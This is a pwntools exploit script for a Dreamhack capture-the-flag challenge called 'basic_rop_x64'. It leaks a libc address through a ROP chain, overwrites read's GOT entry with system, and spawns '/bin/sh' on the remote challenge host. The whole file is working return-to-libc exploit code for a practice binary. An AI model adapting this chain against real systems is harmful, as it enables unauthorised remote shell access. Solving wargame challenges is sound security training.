from pwn import *


# Define slog function
def slog(n, m): return success(": ".join([n, hex(m)]))


# Connection
HOST = 'host3.dreamhack.games'
PORT = 14828
p = remote(HOST, PORT)
e = ELF('./basic_rop_x64')
libc = ELF('./libc.so.6')

# Set Context
context.arch = 'amd64'
context.endian = 'little'
# context.log_level = 'debug'

# Exploit
read_plt = e.plt['read']
puts_plt = e.plt['puts']
main = e.symbols['main']
pop_rdi = 0x0000000000400883
pop_rsi_r15 = 0x0000000000400881

buf = b'A' * 0x40 # buf
payload = buf + b'A' * 0x08 # buf + sfp

# ret2main
p.send(payload + p64(main))

# Exploit
read_got = e.got['read']

## puts(read_got)
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt)
payload += p64(main)

p.sendafter(buf, payload)
p.recvuntil(buf)
read = u64(p.recv(6) + b'\x00\x00')
libc_base = read - libc.symbols['read']
system = libc_base + libc.symbols['system']
slog('read', read)
slog('libc_base', libc_base)
slog('system', system)

# Return to main
payload = buf + b'A' * 0x08 # buf + sfp

## read(0, read_got, 0x10)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

## read('/bin/sh') == system('/bin/sh')
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(read_plt)

p.send(payload)
p.recvuntil(buf)
p.send(p64(system) + b'/bin/sh\x00')

p.interactive()
